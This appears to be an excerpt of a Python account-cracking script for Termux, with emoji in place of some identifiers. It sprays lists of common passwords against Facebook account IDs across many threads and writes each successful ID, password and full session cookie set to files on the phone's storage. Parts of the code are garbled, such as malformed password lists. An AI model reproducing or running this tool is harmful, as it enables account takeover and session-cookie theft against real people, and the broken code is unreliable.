...
xx=requests.get('https://raw.githubusercontent.com/😜110/files/main/ua.txt').text.splitlines()
def clear():
	os.system('clear')
	print(logo)
logo=("""\033[1;94m
...
try:
	key1 = open('/data/data/com.termux/files/usr/bin/.mr😜xxx-cov', 'r').read()
except:
	kok=open('/data/data/com.termux/files/usr/bin/.mr😜xxx-cov', 'w');kok.write(myid);kok.close()
uid = os.getuid()
...
def file():
	...
	with tred(max_workers=20) as aking:
		...
		for user in fo:
			...
			passlist = plist
			if mthd =='1':
				😜.submit(m1,ids,names,passlist,fbcr)
			elif mthd =='2':
				😜.submit(m2,ids,names,passlist,fbcr)
			elif mthd =='3':
				😜.submit(m3,ids,names,passlist,fbcr)
			else:
				😜.submit(m2,ids,names,passlist,fbcr)
	print('\033[1;37m')
	line()
...
def rnd():
	...
	with tred(max_workers=15) as khan:
		...
		for psx in user:
			ids = code+psx
			if 'pk' in ck:
				passlist = [psx,ids,'khankhan','kingkhan','khan1122','janjan','pak123','khan12345','khan123','pubg123','baloch'786786'100200'123456'800900'500500']
			#	passlist = [psx,ids,'khankhan','kingkhan','khan1122']
				...
				passlist = [ids,psx,'khan12','khan1234','khan123','baloch123','khan1122','khan12345','khan123456','khankhan'786787'123456'100200'800900'500600']
...
def m1(ids,names,passlist,fbcr):
	try:
		...
		sys.stdout.write('\r\r\033[1;37m [😜-M1] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if "session_key" in po:
				...
				oks.append(ids)
				open('/sdcard/😜/😜-M1-OK.txt','a').write(ids+'|'+pas+'\n')
				...
				open('/sdcard/😜/😜-M1-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
				break
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
...
def m2(ids,names,passlist,fbcr):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [😝-M2] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if "session_key" in po:
				...
				session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
				open('/sdcard/😜/😜-M2-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
				break
	...
	try:
		...
		for pw in passlist:
			...
			if "session_key" in po:
				...
				print('\r\r\033[1;32m [😜-OK] '+ids+' | '+pas)
				oks.append(ids)
				open('/sdcard/😜/😜-M3-OK.txt','a').write(ids+'|'+pas+'\n')
				session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
				open('/sdcard/😜/😜-M3-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
				break
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	...
	try:
		...
		for pas in passlist:
			...
			if "session_key" in po:
				uid = str(po['uid'])
				token = po['access_token']
				print('\r\r\033[1;32m [😜-OK] '+uid+' | '+pas)
				oks.append(ids)
				open('/sdcard/😜/😜-R-OK.txt','a').write(uid+'|'+pas+'\n')
				session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
				open('/sdcard/😜/😜-R-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
				break
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
